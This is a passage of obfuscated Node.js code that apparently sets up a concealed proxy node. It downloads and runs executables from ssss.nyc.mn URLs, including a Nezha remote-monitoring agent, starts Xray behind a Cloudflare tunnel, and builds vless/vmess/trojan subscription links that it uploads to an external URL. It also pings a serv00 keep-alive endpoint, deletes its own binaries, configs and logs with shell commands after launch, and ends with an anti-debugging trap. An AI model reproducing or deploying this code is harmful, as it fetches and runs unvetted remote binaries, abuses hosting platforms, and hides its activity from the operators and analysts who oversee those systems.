_0x10f1fd=_0x2872d7;fs[_0x10f1fd(0x216)](_0x2c61cd)&&fs[_0x10f1fd(0x181)](_0x2c61cd,_0x9b604e,_0x4d446d=>{const _0x21d6c5=_0x10f1fd;_0x4d446d?console['error']('Empowermen'+_0x21d6c5(0x1e1)+_0x21d6c5(0x227)+_0x2c61cd+':\x20'+_0x4d446d):console[_0x21d6c5(0x115)](_0x21d6c5(0x11e)+_0x21d6c5(0x8d)+_0x21d6c5(0xc0)+_0x2c61cd+':\x20'+_0x9b604e[_0x21d6c5(0x194)](0x8));});});}const _0x1bc84a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1443af(_0x1bc84a),console[_0x1c510f(0x115)]('Starting\x20a'+_0x1c510f(0x16c)+_0x1c510f(0x121)+'mon\x20protec'+'tion...'),await prepareTunnelConfig(),await startNezhaAgent(),await new Promise(_0x2577e6=>setTimeout(_0x2577e6,0x7d0)),await startXray(),await new Promise(_0x44d99e=>setTimeout(_0x44d99e,0x7d0));const _0x3f9761=await startCloudflaredTunnel();_0x3f9761===TUNNEL_TYPES[_0x1c510f(0x276)]?await new Promise(_0x53c7b1=>setTimeout(_0x53c7b1,0x1388)):await new Promise(_0x2cf21a=>setTimeout(_0x2cf21a,0x2710)),console['log'](_0x1c510f(0x244)+'es\x20started'+_0x1c510f(0x217)+'on\x20protect'+'ion'),daemonManager['saveStatus']();}function getFilesForArchitecture(_0x48eb7f){const _0x3f2ac1=_0x3f41d3;let _0x5b40c2;_0x48eb7f==='arm'?_0x5b40c2=[{'fileName':webPath,'fileUrl':_0x3f2ac1(0x16b)+_0x3f2ac1(0x1a2)+_0x3f2ac1(0x18f)},{'fileName':botPath,'fileUrl':'https://ar'+_0x3f2ac1(0x1a2)+'yc.mn/bot'}]:_0x5b40c2=[{'fileName':webPath,'fileUrl':'https://am'+_0x3f2ac1(0x1b2)+'yc.mn/web'},{'fileName':botPath,'fileUrl':_0x3f2ac1(0x15c)+'d64.ssss.n'+_0x3f2ac1(0x255)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb302b9=_0x48eb7f==='arm'?'https://ar'+_0x3f2ac1(0x1a2)+_0x3f2ac1(0x2a6)+'t':'https://am'+'d64.ssss.n'+_0x3f2ac1(0x2a6)+'t';_0x5b40c2[_0x3f2ac1(0x1ac)]({'fileName':npmPath,'fileUrl':_0xb302b9});}else{const _0x4d9237=_0x48eb7f===_0x3f2ac1(0x131)?_0x3f2ac1(0x16b)+_0x3f2ac1(0x1a2)+'yc.mn/v1':_0x3f2ac1(0x15c)+'d64.ssss.n'+'yc.mn/v1';_0x5b40c2['unshift']({'fileName':phpPath,'fileUrl':_0x4d9237});}}return _0x5b40c2;}async function extractTunnelDomain(){const _0x175eae=_0x3f41d3,_0x4fb6f8=daemonManager[_0x175eae(0x14d)];switch(_0x4fb6f8){case TUNNEL_TYPES[_0x175eae(0x276)]:return ARGO_DOMAIN?(console['log']('Fixed\x20tunn'+'el\x20domain:'+'\x20'+ARGO_DOMAIN),daemonManager[_0x175eae(0x98)+_0x175eae(0x224)](TUNNEL_TYPES[_0x175eae(0x276)],ARGO_DOMAIN),ARGO_DOMAIN):(console[_0x175eae(0x7f)](_0x175eae(0x199)+_0x175eae(0x178)+_0x175eae(0x105)+'AIN'),null);case TUNNEL_TYPES[_0x175eae(0x124)]:return ARGO_DOMAIN?(console[_0x175eae(0x115)]('Token\x20tunn'+'el\x20with\x20fi'+_0x175eae(0x2a9)+':\x20'+ARGO_DOMAIN),daemonManager['setTunnelI'+'nfo'](TUNNEL_TYPES[_0x175eae(0x124)],ARGO_DOMAIN),ARGO_DOMAIN):(console[_0x175eae(0x115)](_0x175eae(0x80)+_0x175eae(0x269)+_0x175eae(0x249)+'oken\x20tunne'+'l,\x20extract'+_0x175eae(0x135)+'ogs...'),await extractDomainFromLogs());case TUNNEL_TYPES[_0x175eae(0x29a)]:console['log'](_0x175eae(0xd2)+_0x175eae(0x280)+_0x175eae(0x9e)+'main\x20from\x20'+'logs...');return await extractDomainFromLogs();default:console['error']('Unknown\x20tu'+_0x175eae(0x238));return null;}}async function extractDomainFromLogs(){const _0x48b986=_0x3f41d3;try{if(fs['existsSync'](bootLogPath)){const _0x730261=fs[_0x48b986(0x1f8)+'nc'](bootLogPath,_0x48b986(0x271)),_0x4c3a57=_0x730261['split']('\x0a');for(const _0x20343e of _0x4c3a57){const _0x5da9f4=_0x20343e[_0x48b986(0x1f3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5da9f4&&_0x5da9f4[0x1]){const _0x4e80d8=_0x5da9f4[0x1];return console['log'](_0x48b986(0x2a0)+_0x48b986(0xd6)+'ain:\x20'+_0x4e80d8),_0x4e80d8;}}}return console['log'](_0x48b986(0x25b)+_0x48b986(0x28c)+_0x48b986(0x29d)+_0x48b986(0xe7)+_0x48b986(0xcd)),null;}catch(_0x573f3c){return console[_0x48b986(0x7f)](_0x48b986(0x1ea)+_0x48b986(0x161)+_0x48b986(0xbc),_0x573f3c),null;}}globalThis[_0x3f41d3(0xd4)+_0x3f41d3(0x145)]=async function(_0x555d0f){const _0x53a1ee=_0x3f41d3;if(!_0x555d0f){console['log']('No\x20tunnel\x20'+'domain\x20ava'+'ilable\x20for'+_0x53a1ee(0xc9)+_0x53a1ee(0x230)+_0x53a1ee(0x18c));return;}try{const _0x922b2=await getMetaInfo(),_0x4b356a=NAME?NAME+'-'+_0x922b2:_0x922b2,_0x126343={'v':'2','ps':''+_0x4b356a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x53a1ee(0x10e),'host':_0x555d0f,'path':_0x53a1ee(0x232)+_0x53a1ee(0x100),'tls':_0x53a1ee(0x1eb),'sni':_0x555d0f,'alpn':'','fp':_0x53a1ee(0xd0)},_0x7ecbb1=_0x53a1ee(0x248)+UUID+'@'+CFIP+':'+CFPORT+(_0x53a1ee(0x296)+'n=none&sec'+'urity=tls&'+'sni=')+_0x555d0f+('&fp=firefo'+_0x53a1ee(0x1fd)+_0x53a1ee(0x236))+_0x555d0f+('&path=%2Fv'+_0x53a1ee(0x10f)+_0x53a1ee(0xa5)+'0#')+_0x4b356a+('\x0a\x20\x20\x0avmess:'+'//')+Buffer['from'](JSON[_0x53a1ee(0x16e)](_0x126343))[_0x53a1ee(0x194)]('base64')+(_0x53a1ee(0x1e7)+_0x53a1ee(0x21a))+UUID+'@'+CFIP+':'+CFPORT+(_0x53a1ee(0x285)+_0x53a1ee(0x26f))+_0x555d0f+('&fp=firefo'+_0x53a1ee(0x1fd)+_0x53a1ee(0x236))+_0x555d0f+(_0x53a1ee(0x193)+_0x53a1ee(0x1de)+_0x53a1ee(0x243)+_0x53a1ee(0x1b5))+_0x4b356a+_0x53a1ee(0x15e);return console['log'](_0x53a1ee(0x19e)+_0x53a1ee(0x117)+_0x53a1ee(0xcc)),console['log'](Buffer['from'](_0x7ecbb1)[_0x53a1ee(0x194)](_0x53a1ee(0x103))),fs[_0x53a1ee(0x153)+_0x53a1ee(0x152)](subPath,Buffer[_0x53a1ee(0x13b)](_0x7ecbb1)[_0x53a1ee(0x194)](_0x53a1ee(0x103))),console['log'](FILE_PATH+('/sub.txt\x20s'+'aved\x20succe'+'ssfully')),app['get']('/'+SUB_PATH,(_0x1d5bca,_0x619b8b)=>{const _0x94e9de=_0x53a1ee,_0xc5f97a=Buffer['from'](_0x7ecbb1)[_0x94e9de(0x194)](_0x94e9de(0x103));_0x619b8b[_0x94e9de(0xa9)](_0x94e9de(0x29f)+'pe',_0x94e9de(0x220)+_0x94e9de(0xb3)+'utf-8'),_0x619b8b['send'](_0xc5f97a);}),await uploadNodes(),_0x7ecbb1;}catch(_0x34b385){console[_0x53a1ee(0x7f)]('Error\x20gene'+_0x53a1ee(0x29b)+'scription:',_0x34b385);throw _0x34b385;}};async function uploadNodes(){const _0x44d8db=_0x3f41d3;if(UPLOAD_URL&&PROJECT_URL){const _0x4ccae0=PROJECT_URL+'/'+SUB_PATH,_0x4a796f={'subscription':[_0x4ccae0]};try{const _0x19fa97=await axios['post'](UPLOAD_URL+('/api/add-s'+_0x44d8db(0x28e)+'ns'),_0x4a796f,{'headers':{'Content-Type':'applicatio'+_0x44d8db(0x1a4)}});return _0x19fa97&&_0x19fa97['status']===0xc8?(console['log']('Subscripti'+_0x44d8db(0x1b1)+_0x44d8db(0x234)+'ully'),_0x19fa97):null;}catch(_0x5a7e92){if(_0x5a7e92[_0x44d8db(0xde)]){if(_0x5a7e92['response'][_0x44d8db(0x11c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1b4422=fs[_0x44d8db(0x1f8)+'nc'](listPath,_0x44d8db(0x271)),_0x5a894b=_0x1b4422['split']('\x0a')['filter'](_0x36c2ea=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x36c2ea));if(_0x5a894b[_0x44d8db(0x136)]===0x0)return;const _0x43127b=JSON['stringify']({'nodes':_0x5a894b});try{const _0x311378=await axios[_0x44d8db(0x215)](UPLOAD_URL+(_0x44d8db(0x171)+_0x44d8db(0x1d1)),_0x43127b,{'headers':{'Content-Type':_0x44d8db(0x1ef)+_0x44d8db(0x1a4)}});return _0x311378&&_0x311378[_0x44d8db(0x11c)]===0xc8?(console[_0x44d8db(0x115)]('Nodes\x20uplo'+'aded\x20succe'+'ssfully'),_0x311378):null;}catch(_0xdd5e35){return null;}}else return;}}async function monitorTunnelDomain(){const _0x4c8f1e=_0x3f41d3;console['log']('Starting\x20t'+'unnel\x20doma'+_0x4c8f1e(0x293)+'ing...');let _0x5c38fe=0x0;const _0x479688=0xa,_0x137705=async()=>{const _0x1d9b4d=_0x4c8f1e;while(_0x5c38fe<_0x479688){try{const _0x550c4e=await extractTunnelDomain();if(_0x550c4e)return console[_0x1d9b4d(0x115)]('Tunnel\x20dom'+_0x1d9b4d(0x22b)+_0x1d9b4d(0x27f)+_0x550c4e),globalThis[_0x1d9b4d(0xd4)+_0x1d9b4d(0x145)]&&await globalThis['generateSu'+_0x1d9b4d(0x145)](_0x550c4e),_0x550c4e;else _0x5c38fe++,console[_0x1d9b4d(0x115)](_0x1d9b4d(0x1ff)+'raction\x20at'+'tempt\x20'+_0x5c38fe+'/'+_0x479688+(',\x20waiting.'+'..')),await new Promise(_0x160cac=>setTimeout(_0x160cac,0x1388));}catch(_0x1700d7){console[_0x1d9b4d(0x7f)]('Error\x20extr'+'acting\x20dom'+'ain:',_0x1700d7),_0x5c38fe++,await new Promise(_0x2b4e9e=>setTimeout(_0x2b4e9e,0x1388));}}return console[_0x1d9b4d(0x7f)](_0x1d9b4d(0x200)+_0x1d9b4d(0x87)+_0x1d9b4d(0xad)+_0x1d9b4d(0x218)+_0x479688+'\x20attempts'),null;};if((daemonManager[_0x4c8f1e(0x14d)]===TUNNEL_TYPES['FIXED']||daemonManager[_0x4c8f1e(0x14d)]===TUNNEL_TYPES['TOKEN'])&&ARGO_DOMAIN)return console[_0x4c8f1e(0x115)](_0x4c8f1e(0x133)+_0x4c8f1e(0x189)+'nnel\x20domai'+_0x4c8f1e(0xaf)+ARGO_DOMAIN),daemonManager['setTunnelI'+'nfo'](daemonManager[_0x4c8f1e(0x14d)],ARGO_DOMAIN),globalThis[_0x4c8f1e(0xd4)+_0x4c8f1e(0x145)]&&await globalThis[_0x4c8f1e(0xd4)+_0x4c8f1e(0x145)](ARGO_DOMAIN),ARGO_DOMAIN;return await _0x137705();}function cleanup(){const _0x28ac2b=_0x3f41d3;console['log'](_0x28ac2b(0x127)+'p\x20resource'+'s...'),daemonManager[_0x28ac2b(0x99)]();try{proxyServer['close']();}catch(_0x78857c){console[_0x28ac2b(0x7f)](_0x28ac2b(0xe6)+'ing\x20proxy\x20'+'server:',_0x78857c);}}function cleanFiles(){setTimeout(()=>{const _0x180bea=_0x4d9e,_0x4f284b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4f284b[_0x180bea(0x1c7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4f284b['push'](phpPath);const _0x3f3d52=['daemon_sta'+_0x180bea(0x1d4),'sub.txt',_0x180bea(0xce),_0x180bea(0xf9)+'n',_0x180bea(0x168)+'l'];if(process[_0x180bea(0x187)]==='win32'){const _0x1ac925='del\x20/f\x20/q\x20'+_0x4f284b[_0x180bea(0xf2)](_0x4c3084=>fs[_0x180bea(0x216)](_0x4c3084))[_0x180bea(0x2a1)]('\x20')+(_0x180bea(0x23e)+'1');exec(_0x1ac925,_0x3cb0a6=>{const _0x52ccb3=_0x180bea;console[_0x52ccb3(0x16d)](),console['log'](_0x52ccb3(0x138)+_0x52ccb3(0x126)+'daemon\x20pro'+_0x52ccb3(0x7c)),console[_0x52ccb3(0x115)](_0x52ccb3(0x229)+_0x52ccb3(0x21f)+'ble\x20at\x20/da'+'emon-statu'+'s'),console['log'](_0x52ccb3(0xc2)+_0x52ccb3(0x23a)+'this\x20scrip'+'t,\x20enjoy!');});}else{const _0x5271e6=_0x180bea(0x130)+_0x4f284b[_0x180bea(0xf2)](_0x2fd450=>fs[_0x180bea(0x216)](_0x2fd450))['join']('\x20')+(_0x180bea(0x1cf)+_0x180bea(0x19c));exec(_0x5271e6,_0x4afce0=>{const _0x2982da=_0x180bea;console[_0x2982da(0x16d)](),console['log'](_0x2982da(0x138)+'ning\x20with\x20'+_0x2982da(0x20a)+_0x2982da(0x7c)),console[_0x2982da(0x115)](_0x2982da(0x229)+_0x2982da(0x21f)+'ble\x20at\x20/da'+_0x2982da(0x1c1)+'s'),console[_0x2982da(0x115)]('Thank\x20you\x20'+'for\x20using\x20'+_0x2982da(0x83)+'t,\x20enjoy!');});}},0x15f90);}process['on']('SIGINT',()=>{const _0x1e2c30=_0x3f41d3;console['log']('\x0aReceived\x20'+_0x1e2c30(0x8c)+_0x1e2c30(0x1df)+'..'),cleanup(),process['exit'](0x0);}),process['on'](_0x3f41d3(0x272),()=>{const _0x523220=_0x3f41d3;console['log']('\x0aReceived\x20'+_0x523220(0x1da)+_0x523220(0x95)+_0x523220(0xcd)),cleanup(),process[_0x523220(0x22c)](0x0);}),process['on'](_0x3f41d3(0x22c),()=>{const _0x54d0ac=_0x3f41d3;console[_0x54d0ac(0x115)](_0x54d0ac(0x1cb)+_0x54d0ac(0x19d)+_0x54d0ac(0x192)+'.'),cleanup();}),cleanFiles();async function AddVisitTask(){const _0x2806f0=_0x3f41d3;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20a'+_0x2806f0(0x167)+'matic\x20acce'+_0x2806f0(0x1f5));return;}try{const _0x36c23c=await axios['post'](_0x2806f0(0x23f)+'oo.serv00.'+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2806f0(0x1ef)+_0x2806f0(0x1a4)}});return console[_0x2806f0(0x115)](_0x2806f0(0x27b)+'access\x20tas'+_0x2806f0(0x279)+'ccessfully'),_0x36c23c;}catch(_0x5aefa9){return console['error'](_0x2806f0(0x148)+'tic\x20access'+_0x2806f0(0x114)+_0x2806f0(0x1d9)+_0x5aefa9[_0x2806f0(0x185)]),null;}}async function startserver(){const _0x16a651=_0x3f41d3;try{console[_0x16a651(0x115)](_0x16a651(0xcf)+'erver\x20init'+_0x16a651(0x1c4)+_0x16a651(0x217)+_0x16a651(0x180)+_0x16a651(0x11a)),console[_0x16a651(0x115)]('Daemon\x20Con'+_0x16a651(0x1e6),{'checkInterval':DAEMON_CHECK_INTERVAL,'maxRetries':DAEMON_MAX_RETRIES,'restartDelay':DAEMON_RESTART_DELAY}),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await monitorTunnelDomain(),await AddVisitTask(),console[_0x16a651(0x115)](_0x16a651(0x184)+_0x16a651(0x16f)+'zation\x20Com'+'plete\x20==='),console[_0x16a651(0x115)](_0x16a651(0x26d)+'ce:\x20\x20\x20\x20\x20\x20h'+_0x16a651(0x225)+'lhost:'+PORT),console[_0x16a651(0x115)]('Proxy\x20Serv'+'ice:\x20\x20\x20\x20\x20h'+_0x16a651(0x225)+_0x16a651(0x7e)+EXTERNAL_PORT),console['log'](_0x16a651(0xfa)+_0x16a651(0xa1)+'ttp://loca'+_0x16a651(0x7e)+PORT+('/daemon-st'+_0x16a651(0x1d3))),console[_0x16a651(0x115)]('Subscripti'+'on:\x20\x20\x20\x20\x20\x20h'+_0x16a651(0x225)+'lhost:'+PORT+'/'+SUB_PATH),console[_0x16a651(0x115)]('Tunnel\x20Typ'+'e:\x20\x20\x20\x20\x20\x20\x20'+(daemonManager[_0x16a651(0x14d)]||'unknown')),console[_0x16a651(0x115)](_0x16a651(0x277)+_0x16a651(0x231)+(daemonManager['tunnelDoma'+'in']||'pending')),console[_0x16a651(0x115)](_0x16a651(0x1f6)+_0x16a651(0x1f6)+_0x16a651(0x1f6)+_0x16a651(0x92));}catch(_0x38ca6f){console[_0x16a651(0x7f)](_0x16a651(0xdd)+_0x16a651(0x270)+':',_0x38ca6f);}}app[_0x3f41d3(0x8b)](PORT,()=>{const _0x39c723=_0x3f41d3;console['log'](_0x39c723(0x13a)+_0x39c723(0x165)+_0x39c723(0x196)+_0x39c723(0x262)+':'+PORT+'!'),console[_0x39c723(0x115)](_0x39c723(0x179)+'points:'),console[_0x39c723(0x115)]('\x20\x20GET\x20\x20/da'+'emon-statu'+_0x39c723(0x294)+_0x39c723(0x1e0)+_0x39c723(0x281)+_0x39c723(0xd9)),console[_0x39c723(0x115)]('\x20\x20POST\x20/re'+_0x39c723(0x91)+'e\x20\x20-\x20Resta'+'rt\x20specifi'+_0x39c723(0xe1)+'(nezha/xra'+_0x39c723(0x24a)+_0x39c723(0x2a4));}),startserver()['catch'](_0x27b94b=>{const _0x23cc41=_0x3f41d3;console['error']('Unhandled\x20'+_0x23cc41(0x24c)+'tartserver'+':',_0x27b94b);});function _0x3b367c(_0x463746){function _0x1cb691(_0x1af906){const _0x54985a=_0x4d9e;if(typeof _0x1af906===_0x54985a(0x1c3))return function(_0x10d469){}['constructo'+'r'](_0x54985a(0xb5)+_0x54985a(0x1b7))['apply']('counter');else(''+_0x1af906/_0x1af906)['length']!==0x1||_0x1af906%0x14===0x0?function(){return!![];}['constructo'+'r'](_0x54985a(0xd3)+_0x54985a(0x25a))[_0x54985a(0x94)](_0x54985a(0x17b)):function(){return![];}['constructo'+'r'](_0x54985a(0xd3)+_0x54985a(0x25a))['apply']('stateObjec'+'t');_0x1cb691(++_0x1af906);}try{if(_0x463746)return _0x1cb691;else _0x1cb691(0x0);}catch(_0x15bc74){}}
